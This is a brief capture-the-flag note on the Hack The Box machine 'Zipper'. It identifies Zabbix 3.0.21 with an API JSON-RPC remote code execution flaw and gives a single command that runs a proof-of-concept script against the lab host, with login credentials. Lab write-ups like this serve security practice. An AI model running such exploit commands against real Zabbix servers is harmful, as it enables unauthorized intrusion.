## Zipper (HTB)

[Zipper Machine](https://www.hackthebox.com/machines/zipper)

Identified Software:
- Zabbix 3.0.21

Identified Vulnerability:
- API JSON-RPC Remote Code Execution

Run Script:
```
python3 poc.py -t http://zipper.htb/zabbix -un zapper -ps zapper -hi 10105
```